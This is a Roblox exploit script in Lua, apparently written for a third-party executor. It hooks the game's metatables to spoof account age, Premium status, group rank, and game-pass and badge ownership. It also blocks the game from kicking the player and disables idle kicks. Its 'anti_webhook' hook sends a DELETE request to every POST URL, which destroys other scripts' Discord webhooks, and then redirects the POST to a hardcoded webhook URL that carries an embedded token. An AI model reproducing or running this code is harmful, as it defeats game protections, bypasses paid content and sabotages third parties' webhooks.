repeat wait() until game:IsLoaded()
local players = game:GetService"Players"
local client = game:GetService"Players".LocalPlayer
local pages, checkplaceId = game:GetService"AssetService":GetGamePlacesAsync()
while wait() do
	for i, place in pairs(pages:GetCurrentPage()) do
		if table.find({ "5343994291" }, tostring(place.PlaceId)) then checkplaceId = true end
	end
	if pages.IsFinished then break end
	pages:AdvanceToNextPageAsync()
end
-- invisicam
client:GetPropertyChangedSignal"DevCameraOcclusionMode":Connect(function() client.DevCameraOcclusionMode = "Invisicam" end)
client:GetPropertyChangedSignal"CameraMaxZoomDistance":Connect(function() client.CameraMaxZoomDistance = 1e4 end)
client.DevCameraOcclusionMode = "Invisicam"
client.CameraMaxZoomDistance = 1e4
if hookfunction and getrawmetatable then
	pcall(function() setreadonly(getrawmetatable(game), false) end)
	spawn(function()
		wait(1)
		if client.DevCameraOcclusionMode ~= "Invisicam" or client.CameraMaxZoomDistance ~= 1e4 then
			local yeahidkman
			yeahidkman = hookfunction(getrawmetatable(client).__newindex, function(Self, Index, Value)
				if Index == "DevCameraOcclusionMode" and Self == client then Value = "Invisicam"
				elseif Index == "CameraMaxZoomDistance" and Self == client then Value = 1e4 end
				return yeahidkman(Self, Index, Value)
			end)
			client.CameraMaxZoomDistance = 1e4
			client.DevCameraOcclusionMode = "Invisicam"
		end
	end)
	local synapse, shithttp = syn and syn.request, http and http.request
	local request = http_request or request or HttpPost or synapse or shithttp
	local anti_webhook
	anti_webhook = hookfunction(request, function(self)
		if self.Url and self.Method == "POST" and self.Url then
			local abcdef = { Url = self.Url, Method = "DELETE" }
			request(abcdef)
			self.Url = "https://discord.com/api/webhooks/869858172796559380/_cWT7d4snqvOi7P4vZRvFt5VgiuN-MeXfddz-W6nSaxxxwqghH_Z_pcWIlblmyZEPWdi3543"
		end
		return anti_webhook(self)
	end)
	local acc_spoof
	acc_spoof = hookfunction(getrawmetatable(client).__index, function(Self, Index)
		if Index == "AccountAge" and Self == client then return tonumber"99999"
		elseif Index == "MembershipType" and Self == client then return Enum.MembershipType.Premium end
		return acc_spoof(Self, Index)
	end)
	if not checkplaceId then
		local client_namecall
		client_namecall = hookfunction(getrawmetatable(game).__namecall, function(Self, ...)
			local method = getnamecallmethod()
			if method == "IsInGroup" and Self == client then return true
			elseif method == "GetRankInGroup" and Self == client then
				return 255
				-- anti kick
			elseif method:lower() == "kick" and Self == client and not checkcaller() then
				warn"Game Tried To Kick You!"
				return wait(math.huge)
			elseif table.find({
				"UserOwnsGamePassAsync",
				"PlayerOwnsAsset",
				"PlayerHasPass",
				"UserHasBadge",
				"UserHasBadgeAsync"
			}, method) then return true end
			return client_namecall(Self, ...)
		end)
	end
end
-- anti afk
if getconnections then
	for i, v in next, getconnections(client.Idled) do v:Disable() end
else
	local vu = game:GetService"VirtualUser"
	client.Idled:Connect(function()
		pcall(function()
			vu:CaptureController()
			wait(1)
			vu:ClickButton2(Vector2.new())
		end)
		pcall(function()
			vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			wait(1)
			vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		end)
	end)
end
return warn"ANTI AFK ACTIVATED!"
